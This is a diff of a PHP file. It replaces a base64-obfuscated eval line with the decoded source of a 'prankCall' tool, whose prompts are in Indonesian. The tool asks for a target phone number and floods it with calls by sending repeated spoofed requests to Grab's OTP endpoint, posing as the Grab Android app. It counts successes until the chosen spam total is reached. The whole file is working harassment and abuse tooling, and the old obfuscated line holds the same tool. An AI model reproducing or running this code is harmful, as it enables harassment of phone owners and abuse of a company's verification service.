@@ -1,1 +1,110 @@
-<?php eval("?>".base64_decode("PD9waHANCmZ1bmN0aW9uIGdldCgpew0KCXJldHVybiB0cmltKGZnZXRzKFNURElOKSk7DQp9DQpjbGFzcyBwcmFua0NhbGx7DQoJcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRubyl7DQoJCSR0aGlzLT5udW1iZXIgPSAkbm87DQoJfQ0KCXByaXZhdGUgZnVuY3Rpb24gZ2V0KCl7DQoJCXJldHVybiB0cmltKGZnZXRzKFNURElOKSk7DQoJfQ0KCXByaXZhdGUgZnVuY3Rpb24gY29ycmVjdCgkbm8pew0KCQkkY2VrID0gc3Vic3RyKCRubywwLDIpOw0KCQlpZigkY2VrPT0iMDgiKXsNCgkJCSRubyA9ICI2MiIuc3Vic3RyKCRubywxKTsNCgkJfQ0KCQlyZXR1cm4gJG5vOw0KCX0NCglwcml2YXRlIGZ1bmN0aW9uIGVrc2UoKXsNCgkJJG5vID0gJHRoaXMtPmNvcnJlY3QoJHRoaXMtPm51bWJlcik7DQoJCSRyYW5kID0gcmFuZCgwMTIzNDU2LDk5OTk5OTkpOw0KCQkkcmFuZHMgPSAkdGhpcy0+cmFuZFN0cigxMik7DQoJCSRwb3N0ID0gIm1ldGhvZD1DQUxMJmNvdW50cnlDb2RlPWlkJnBob25lTnVtYmVyPSRubyZ0ZW1wbGF0ZUlEPXBheF9hbmRyb2lkX3Byb2R1Y3Rpb24iOw0KCQkkaFtdID0gIngtcmVxdWVzdC1pZDogZWJmNjFiYzMtODA5Mi00OTI0LWJmNDUtJHJhbmRzIjsNCgkJJGhbXSA9ICJBY2NlcHQtTGFuZ3VhZ2U6IGluLUlEO3E9MS4wLCBlbi11cztxPTAuOSwgZW47cT0wLjgiOw0KCQkkaFtdID0gIlVzZXItQWdlbnQ6IEdyYWIvNS4yMC4wIChBbmRyb2lkIDYuMC4xOyBCdWlsZCAkcmFuZCkiOw0KCQkkaFtdID0gIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIjsNCgkJJGhbXSA9ICJDb250ZW50LUxlbmd0aDogIi5zdHJsZW4oJHBvc3QpOw0KCQkkaFtdID0gIkhvc3Q6IGFwaS5ncmFiLmNvbSI7DQoJCSRoW10gPSAiQ29ubmVjdGlvbjogY2xvc2UiOw0KCQkkY2ggPSBjdXJsX2luaXQoKTsNCgkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImh0dHBzOi8vYXBpLmdyYWIuY29tL2dyYWJpZC92MS9waG9uZS9vdHAiKTsNCgkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgJHBvc3QpOw0KCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSFRUUEhFQURFUiwgJGgpOw0KCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KCQkkeCA9IGN1cmxfZXhlYygkY2gpOyBjdXJsX2Nsb3NlKCRjaCk7DQoJCSRla3NlID0ganNvbl9kZWNvZGUoJHgsdHJ1ZSk7DQoJCWlmKGVtcHR5KCRla3NlWydjaGFsbGVuZ2VJRCddKSl7DQoJCQllY2hvICJTcGFtIERpIEJhdGFsa2FubiI7DQoJCX1lbHNlew0KCQkJZWNobyAiIFNwYW0gU3Vrc2VzbiI7DQoJCX0NCgl9DQoJcHJpdmF0ZSBmdW5jdGlvbiBsb29wKCRtYW55LCRzbGVlcD1udWxsKXsNCgkJJGE9MDsNCgkJJG5vID0gJHRoaXMtPmNvcnJlY3QoJHRoaXMtPm51bWJlcik7DQoJCXdoaWxlKCRhPCRtYW55KXsNCgkJCSRyYW5kID0gcmFuZCgwMTIzNDU2LDk5OTk5OTkpOw0KCQkJJHJhbmRzID0gJHRoaXMtPnJhbmRTdHIoMTIpOw0KCQkJJHBvc3QgPSAibWV0aG9kPUNBTEwmY291bnRyeUNvZGU9aWQmcGhvbmVOdW1iZXI9JG5vJnRlbXBsYXRlSUQ9cGF4X2FuZHJvaWRfcHJvZHVjdGlvbiI7DQoJCQkkaFtdID0gIngtcmVxdWVzdC1pZDogZWJmNjFiYzMtODA5Mi00OTI0LWJmNDUtJHJhbmRzIjsNCgkJCSRoW10gPSAiQWNjZXB0LUxhbmd1YWdlOiBpbi1JRDtxPTEuMCwgZW4tdXM7cT0wLjksIGVuO3E9MC44IjsNCgkJCSRoW10gPSAiVXNlci1BZ2VudDogR3JhYi81LjIwLjAgKEFuZHJvaWQgNi4wLjE7IEJ1aWxkICRyYW5kKSI7DQoJCQkkaFtdID0gIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIjsNCgkJCSRoW10gPSAiQ29udGVudC1MZW5ndGg6ICIuc3RybGVuKCRwb3N0KTsNCgkJCSRoW10gPSAiSG9zdDogYXBpLmdyYWIuY29tIjsNCgkJCSRoW10gPSAiQ29ubmVjdGlvbjogY2xvc2UiOw0KCQkJJGNoID0gY3VybF9pbml0KCk7DQoJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAiaHR0cHM6Ly9hcGkuZ3JhYi5jb20vZ3JhYmlkL3YxL3Bob25lL290cCIpOw0KCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KCQkJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsICRwb3N0KTsNCgkJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IVFRQSEVBREVSLCAkaCk7DQoJCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KCQkJJHggPSBjdXJsX2V4ZWMoJGNoKTsgY3VybF9jbG9zZSgkY2gpOw0KCQkJJGVrc2UgPSBqc29uX2RlY29kZSgkeCx0cnVlKTsNCgkJCWlmKGVtcHR5KCRla3NlWydjaGFsbGVuZ2VJRCddKSl7DQoJCQkJY29udGludWU7DQoJCQl9ZWxzZXsNCgkJCQkkbm4gPSAkYSsxOw0KCQkJCSRhKys7DQoJCQl9DQoJCQlpZigkc2xlZXAhPW51bGwpIHNsZWVwKCRzbGVlcCk7DQoJCQlpZigkYT49JG1hbnkpIGVjaG8gIlNwYW0gQmVyaGFzaWwgRGkgS2lyaW1rYW4hIjsNCgkJfQ0KCX0NCglwcml2YXRlIGZ1bmN0aW9uIHJhbmRTdHIoJGwpew0KCQkkZGF0YSA9ICJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTAiOw0KCQkkd29yZCA9ICIiOw0KCQlmb3IoJGE9MDskYTwkbDskYSsrKXsNCgkJCSR3b3JkIC49ICRkYXRhe3JhbmQoMCxzdHJsZW4oJGRhdGEpLTEpfTsNCgkJfQ0KCQlyZXR1cm4gJHdvcmQ7DQoJfQ0KCXB1YmxpYyBmdW5jdGlvbiBydW4oKXsNCgkJd2hpbGUodHJ1ZSl7DQoJCQllY2hvICJBcGFrYWggTm9tb3IgVGFyZ2V0IFN1ZGFoIEJlbmFyID8gOiAiOw0KCQkJJGxvb3AgPSAkdGhpcy0+Z2V0KCk7DQoJCQlpZigkbG9vcD09InkiIE9SICRsb29wPT0ibiIpew0KCQkJCWJyZWFrOw0KCQkJfWVsc2V7DQoJCQkJZWNobyAiSmlrYSBZYSBKYXdhYiB5IEppa2EgVGlkYWsgSmF3YWIgbm4iOw0KCQkJCWNvbnRpbnVlOw0KCQkJfQ0KCQl9DQoJCWlmKCRsb29wPT0ieSIpew0KCQkJZWNobyAiQmVyYXBhIFNwYW0gWWFuZyBBa2FuIERpIEtpcmlta2FuID8gOiAiOw0KCQkJJG1hbnkgPSAkdGhpcy0+Z2V0KCk7DQoJCQkkdGhpcy0+bG9vcCgkbWFueSk7DQoJCX1lbHNlew0KCQkJJHRoaXMtPmVrc2UoKTsNCgkJfQ0KCX0NCn0NCmVjaG8gIk1hc3Vra2FuIE5vbW9yIFRhcmdldCA6ICI7DQokbm8gPSBnZXQoKTsNCiRuID0gbmV3IHByYW5rQ2FsbCgkbm8pOw0KJG4tPnJ1bigpOw0K")); ?>
+<?php
+function get(){
+	return trim(fgets(STDIN));
+}
+class prankCall{
+	public function __construct($no){
+		$this->number = $no;
+	}
+	private function get(){
+		return trim(fgets(STDIN));
+	}
+	private function correct($no){
+		$cek = substr($no,0,2);
+		if($cek=="08"){
+			$no = "62".substr($no,1);
+		}
+		return $no;
+	}
+	private function ekse(){
+		$no = $this->correct($this->number);
+		$rand = rand(0123456,9999999);
+		$rands = $this->randStr(12);
+		$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
+		$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
+		$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
+		$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
+		$h[] = "Content-Type: application/x-www-form-urlencoded";
+		$h[] = "Content-Length: ".strlen($post);
+		$h[] = "Host: api.grab.com";
+		$h[] = "Connection: close";
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
+		curl_setopt($ch, CURLOPT_POST, 1);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+		curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		$x = curl_exec($ch); curl_close($ch);
+		$ekse = json_decode($x,true);
+		if(empty($ekse['challengeID'])){
+			echo "Spam Di Batalkann";
+		}else{
+			echo " Spam Suksesn";
+		}
+	}
+	private function loop($many,$sleep=null){
+		$a=0;
+		$no = $this->correct($this->number);
+		while($a<$many){
+			$rand = rand(0123456,9999999);
+			$rands = $this->randStr(12);
+			$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
+			$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
+			$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
+			$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
+			$h[] = "Content-Type: application/x-www-form-urlencoded";
+			$h[] = "Content-Length: ".strlen($post);
+			$h[] = "Host: api.grab.com";
+			$h[] = "Connection: close";
+			$ch = curl_init();
+			curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
+			curl_setopt($ch, CURLOPT_POST, 1);
+			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+			curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+			$x = curl_exec($ch); curl_close($ch);
+			$ekse = json_decode($x,true);
+			if(empty($ekse['challengeID'])){
+				continue;
+			}else{
+				$nn = $a+1;
+				$a++;
+			}
+			if($sleep!=null) sleep($sleep);
+			if($a>=$many) echo "Spam Berhasil Di Kirimkan!";
+		}
+	}
+	private function randStr($l){
+		$data = "abcdefghijklmnopqrstuvwxyz1234567890";
+		$word = "";
+		for($a=0;$a<$l;$a++){
+			$word .= $data{rand(0,strlen($data)-1)};
+		}
+		return $word;
+	}
+	public function run(){
+		while(true){
+			echo "Apakah Nomor Target Sudah Benar ? : ";
+			$loop = $this->get();
+			if($loop=="y" OR $loop=="n"){
+				break;
+			}else{
+				echo "Jika Ya Jawab y Jika Tidak Jawab nn";
+				continue;
+			}
+		}
+		if($loop=="y"){
+			echo "Berapa Spam Yang Akan Di Kirimkan ? : ";
+			$many = $this->get();
+			$this->loop($many);
+		}else{
+			$this->ekse();
+		}
+	}
+}
+echo "Masukkan Nomor Target : ";
+$no = get();
+$n = new prankCall($no);
+$n->run();
+?>
+
